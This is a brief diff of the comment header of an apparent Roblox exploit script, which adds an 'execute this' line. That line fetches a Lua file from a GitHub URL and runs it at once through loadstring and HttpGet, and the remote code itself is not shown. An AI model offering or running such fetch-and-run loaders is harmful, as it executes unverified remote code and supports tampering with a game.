@@ -6,7 +6,7 @@ Made by Exodus
 if your exploit does not have rconsole functions, this script may break
 ___________________________
 execute this:
-
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Edward-Bill/Scripts/main/SB%2CPeruanito%20KRNL.lua"))()
 
 
 ]]--
